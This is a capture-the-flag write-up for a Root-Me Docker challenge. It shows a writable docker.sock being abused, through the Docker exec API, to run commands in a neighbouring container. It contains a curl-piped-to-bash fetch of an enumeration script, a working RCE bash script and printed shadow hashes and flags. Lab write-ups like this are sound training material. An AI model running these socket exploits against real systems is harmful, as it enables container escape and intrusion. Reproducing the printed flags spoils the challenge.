# Docker Talk Through Me

## Description

Now that you have demonstrated to the system administrator that his containers were not secure, he therefore asks you to log in to test the security of his new container while he deploys a second one.

- Start the CTF-ATD "Talk through me"  
- Log on to the machine docker using SSH on port 2222 (root / JL&g#4zNkQ&ztF8b)  
- Challenge validation password is in the file .passwd  

## Solution

```bash
➜ ssh ctf03.root-me.org -l root -p 2222
root@1nmyd0ck3r:~# cat foryou.txt
Hey mate, once you will finished to configure this container, I leave you a private note in the another container in /opt/notes/
```

Hmmm... `/opt` directory is empty?
```bash
root@1nmyd0ck3r:~# ls -alh /opt/
total 8.0K
drwxr-xr-x 2 root root 4.0K Jan  5  2022 .
drwxr-xr-x 1 root root 4.0K Jan 16  2022 ..
```

Since we are in Docker let's do some research
1. [https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/index.html](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/index.html)
2. [https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/index.html](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/index.html)

We can also perform auto enumeration [https://github.com/stealthcopter/deepce](https://github.com/stealthcopter/deepce)
```bash
root@1nmyd0ck3r:~# curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh | bash
 Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE) by stealthcopter
===================================( Enumerating Platform )===================================
[+] Inside Container ........ Yes
[+] Container Platform ...... docker
[+] Container tools ......... None
[+] User .................... root
[+] Groups .................. root
[+] Sudoers ................. No
[+] Docker Executable ....... Not Found
[+] Docker Sock ............. Yes
srw-rw---- 1 root 998 0 Mar  6 05:46 /var/run/docker.sock
[+] Sock is writable ........ Yes
The docker sock is writable, we should be able to enumerate docker, create containers
and obtain root privs on the host machine
See https://stealthcopter.github.io/deepce/guides/docker-sock.md

To see full info from the docker sock output run the following

curl -s --unix-socket /var/run/docker.sock http://localhost/info

KernelVersion:5.10.0-10-amd64
OperatingSystem:Debian GNU/Linux 11 (bullseye)
OSType:linux
Architecture:x86_64
NCPU:2
DockerRootDir:/var/lib/docker
Name:dockerescape2
ServerVersion:20.10.12
[+] Docker Version .......... 20.10.12
[+] CVE–2019–13139 .......... No
[+] CVE–2019–5736 ........... No
==================================( Enumerating Container )===================================
[+] Container ID ............ 1nmyd0ck3r
[+] Container Full ID ....... /
[+] Container Name .......... Could not get container name through reverse DNS
[+] Container IP ............ 10.66.3.100 172.17.0.1
[+] DNS Server(s) ........... 8.8.8.8
[+] Host IP ................. 10.66.3.1
[+] Operating System ........ Ubuntu
[+] Kernel .................. 5.10.0-10-amd64
[+] Arch .................... x86_64
[+] CPU ..................... Intel(R) Xeon(R) CPU E5-2640 v4 @ 2.40GHz
[+] Useful tools installed .. Yes
/usr/bin/curl
/usr/bin/wget
/usr/bin/hostname
/usr/bin/python3
[+] Dangerous Capabilities .. Yes
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
[+] SSHD Service ............ Yes (port Port 2222)
[+] Privileged Mode ......... No
====================================( Enumerating Mounts )====================================
[+] Docker sock mounted ....... Yes
The docker sock is writable, we should be able to enumerate docker, create containers
and obtain root privs on the host machine
See https://stealthcopter.github.io/deepce/guides/docker-sock.md

[+] Other mounts .............. No
====================================( Interesting Files )=====================================
[+] Interesting environment variables ... No
[+] Any common entrypoint files ......... Yes
-rw-r--r-- 1 root root 39K Mar  6 05:53 /root/deepce.sh
[+] Interesting files in root ........... No
[+] Passwords in common files ........... No
[+] Home directories .................... No
[+] Hashes in shadow file ............... Yes
$6$TJUgv1dEzVBjb63K$Dw0GLeuCC0RUBWksRygoJ9Tj0dYETzdyPwBeLY43qSgRDqb3WZtX6kyueBG.u5Q9dNJnwuCwStd7O5yTZI.d3/
[+] Searching for app dirs ..............
==================================( Enumerating Containers )==================================
By default containers can communicate with other containers on the same network and the
host machine, this can be used to enumerate further

TODO Enumerate container using sock
==============================================================================================
```

![docker---talk-through-me.png](/assets/ctf/root-me/docker-talk-through-me.png)

If `docker.sock` exists inside a container, it can be a **major security vulnerability** because it allows interaction with the **Docker daemon**. The Docker socket (`/run/docker.sock`) gives **root-equivalent access** to the host system since Docker itself runs as root.

[Exploit docker.sock to mount root filesystem in a container](https://gist.github.com/PwnPeter/3f0a678bf44902eae07486c9cc589c25/raw/1f09664b0ae7b54aff33703f240a2bde4ddf5ec9/exploit-docker-sock.sh)

```json
root@1nmyd0ck3r:~# curl -s --unix-socket /run/docker.sock http://localhost/images/json | python3 -m json.tool
[
    {
        "Containers": -1,
        "Created": 1741240008,
        "Id": "sha256:29046f3edd9e3c57e76395ce4837e188376f58cd55c306a1f8bc97f90c1c01cc",
        "Labels": null,
        "ParentId": "sha256:25be5ce800fbcdaa0028a3ca54906680d734f48a745d388ee601e0967fbf94f3",
        "RepoDigests": null,
        "RepoTags": [
            "docker_flag:latest"
        ],
        "SharedSize": -1,
        "Size": 5585907,
        "VirtualSize": 5585907
    },
    {
        "Containers": -1,
        "Created": 1644779779,
        "Id": "sha256:b24d392b8d8d232c0030afbf60c054d30c230b4334554d31f0a0873b3c897a4e",
        "Labels": null,
        "ParentId": "sha256:e099c4b80f94271936c131e54c6d0ac89724441c1aaa892033333d063cf70e84",
        "RepoDigests": [
            "<none>@<none>"
        ],
        "RepoTags": [
            "<none>:<none>"
        ],
        "SharedSize": -1,
        "Size": 5585876,
        "VirtualSize": 5585876
    },
    {
        "Containers": -1,
        "Created": 1643374178,
        "Id": "sha256:03a05013dc02d87620376fb7ca690e78871259ed2836913cd8456978aaf0754a",
        "Labels": null,
        "ParentId": "sha256:b5c66c942ecde9986dc135e0fe85b52d69f825c55f5ab2c5943aee5b3ef934ef",
        "RepoDigests": [
            "<none>@<none>"
        ],
        "RepoTags": [
            "<none>:<none>"
        ],
        "SharedSize": -1,
        "Size": 5585880,
        "VirtualSize": 5585880
    },
    {
        "Containers": -1,
        "Created": 1642330402,
        "Id": "sha256:477b687e9d5564048715c9cc89e595344920fae98259f95135860e47d5052b32",
        "Labels": null,
        "ParentId": "sha256:8bdef1da1ab73247330b2a8cac263bae3c5791dab72d06cd65617fecd40b6cb1",
        "RepoDigests": null,
        "RepoTags": [
            "docker_escape2:latest"
        ],
        "SharedSize": -1,
        "Size": 283388858,
        "VirtualSize": 283388858
    },
    {
        "Containers": -1,
        "Created": 1641652039,
        "Id": "sha256:ae2d456226cc83b1be65b312673d34773494e7b8c36dce17ab0bd7ed69adc64f",
        "Labels": null,
        "ParentId": "sha256:93393fe497a8841c6ad3373444cc79aac0dc6078c4b6e50b08db78417ef9b686",
        "RepoDigests": [
            "<none>@<none>"
        ],
        "RepoTags": [
            "<none>:<none>"
        ],
        "SharedSize": -1,
        "Size": 5585874,
        "VirtualSize": 5585874
    },
    {
        "Containers": -1,
        "Created": 1641522330,
        "Id": "sha256:d13c942271d66cb0954c3ba93e143cd253421fe0772b8bed32c4c0077a546d4d",
        "Labels": null,
        "ParentId": "",
        "RepoDigests": [
            "ubuntu@sha256:b5a61709a9a44284d88fb12e5c48db0409cfad5b69d4ff8224077c57302df9cf"
        ],
        "RepoTags": [
            "ubuntu:latest"
        ],
        "SharedSize": -1,
        "Size": 72776453,
        "VirtualSize": 72776453
    },
    {
        "Containers": -1,
        "Created": 1637785180,
        "Id": "sha256:c059bfaa849c4d8e4aecaeb3a10c2d9b3d85f5165c66ad3a4d937758128c4d18",
        "Labels": null,
        "ParentId": "",
        "RepoDigests": [
            "alpine@sha256:21a3deaa0d32a8057914f36584b5288d2e5ecc984380bc0118285c70fa8c9300"
        ],
        "RepoTags": [
            "alpine:latest"
        ],
        "SharedSize": -1,
        "Size": 5585772,
        "VirtualSize": 5585772
    }
]
```

If we had to guess the flag must be on `docker_flag` container, if we can access it.
```json
root@1nmyd0ck3r:~# curl -s --unix-socket /run/docker.sock http://localhost/containers/json | python3 -m json.tool
[
    {
        "Id": "d0046744fed19a9e29490c8cf94fb72c67872623c23a9120403f6b1f0d38d103",
        "Names": [
            "/docker_flag"
        ],
        "Image": "docker_flag",
        "ImageID": "sha256:29046f3edd9e3c57e76395ce4837e188376f58cd55c306a1f8bc97f90c1c01cc",
        "Command": "/bin/sh",
        "Created": 1741240008,
        "Ports": [],
        "Labels": {},
        "State": "running",
        "Status": "Up 17 minutes",
        "HostConfig": {
            "NetworkMode": "default"
        },
        "NetworkSettings": {
            "Networks": {
                "bridge": {
                    "IPAMConfig": null,
                    "Links": null,
                    "Aliases": null,
                    "NetworkID": "36a6d56028449691d76216c3b1bbcb6db4f59e0b4df3f8677516cd74b3f997bb",
                    "EndpointID": "c6c1e0ae7244f52bba871da3f33572f9c2f16a9daf96a36ba6eba5199c3a69a8",
                    "Gateway": "172.17.0.1",
                    "IPAddress": "172.17.0.2",
                    "IPPrefixLen": 16,
                    "IPv6Gateway": "",
                    "GlobalIPv6Address": "",
                    "GlobalIPv6PrefixLen": 0,
                    "MacAddress": "02:42:ac:11:00:02",
                    "DriverOpts": null
                }
            }
        },
        "Mounts": []
    },
    {
        "Id": "76b79677e3cc5db8764df08d7547472a94b1ad480e45193ace7a843b564522a0",
        "Names": [
            "/escape2"
        ],
        "Image": "docker_escape2",
        "ImageID": "sha256:477b687e9d5564048715c9cc89e595344920fae98259f95135860e47d5052b32",
        "Command": "/bin/sh -c '/etc/init.d/ssh restart && bash'",
        "Created": 1642330435,
        "Ports": [],
        "Labels": {},
        "State": "running",
        "Status": "Up 17 minutes",
        "HostConfig": {
            "NetworkMode": "host"
        },
        "NetworkSettings": {
            "Networks": {
                "host": {
                    "IPAMConfig": null,
                    "Links": null,
                    "Aliases": null,
                    "NetworkID": "22e223c6f2b6af2f42748ec77f923af014b4a08765797718756d2cdf2022ca7d",
                    "EndpointID": "1b33706c719df2134f877078bed3c87dadfd904eb8d72273224037ddf1bc5482",
                    "Gateway": "",
                    "IPAddress": "",
                    "IPPrefixLen": 0,
                    "IPv6Gateway": "",
                    "GlobalIPv6Address": "",
                    "GlobalIPv6PrefixLen": 0,
                    "MacAddress": "",
                    "DriverOpts": null
                }
            }
        },
        "Mounts": [
            {
                "Type": "bind",
                "Source": "/var/run/docker.sock",
                "Destination": "/var/run/docker.sock",
                "Mode": "",
                "RW": true,
                "Propagation": "rprivate"
            }
        ]
    }
]
```

Getting reverse shell is not ideal for our case, container already exists and we would like to get RCE.
[https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)

```bash
#!/bin/bash
set -e

if [ $# -lt 2 ]; then echo "Usage: $0 <CONTAINER_ID> <COMMAND>"; exit 1; fi

CONTAINER_ID="$1"
shift
COMMAND="$*"  # Allow multi-word commands with spaces and quotes
DOCKER_HOST='http://localhost'
DOCKER_SOCK='/var/run/docker.sock'
CONTENT_TYPE='Content-Type: application/json'

# Create exec instance
echo "Creating exec instance for command: $COMMAND"
COMMAND=$(printf '%s' "$COMMAND" | sed 's/"/\\"/g')

resp=$(curl -s --unix-socket "$DOCKER_SOCK" \
  "$DOCKER_HOST/containers/$CONTAINER_ID/exec" \
  -H "$CONTENT_TYPE" \
  -d '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["sh","-c","'"$COMMAND"'"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}'
)

# Extract exec ID
exec_id=$(echo "$resp" | grep -o '"Id":"[^"]*"' | cut -d'"' -f4)
echo "Exec ID: $exec_id"

# Start execution
echo "Command Output:"
curl -s --unix-socket "$DOCKER_SOCK" \
  "$DOCKER_HOST/exec/$exec_id/start" \
  -H "$CONTENT_TYPE" \
  -H "Accept: application/json" \
  -d '{"Detach": false, "Tty": false}' | tr -d '\0'
```

RCE works with multiple commands
```bash
root@1nmyd0ck3r:/dev/shm# bash rce.sh d0046744fed19a9e29490c8cf94fb72c67872623c23a9120403f6b1f0d38d103 'cat /opt/notes/note.txt'
&Hey mate, nice to meet you here ! :)
```

Get flag
- For challenge
```bash
root@1nmyd0ck3r:/dev/shm# bash rce.sh d0046744fed19a9e29490c8cf94fb72c67872623c23a9120403f6b1f0d38d103 'cat /opt/notes/.passwd'
BYou got Me ! This is the flag : f4f179a78dae34be3e474d9b3f258da6
```

> Flag: `f4f179a78dae34be3e474d9b3f258da6`

- For CTF-ATD
```bash
root@1nmyd0ck3r:/dev/shm# bash rce.sh d0046744fed19a9e29490c8cf94fb72c67872623c23a9120403f6b1f0d38d103 'cat /passwd'
"90879d059738acd91fc27e2f66406fa6
```

> Flag: `90879d059738acd91fc27e2f66406fa6`
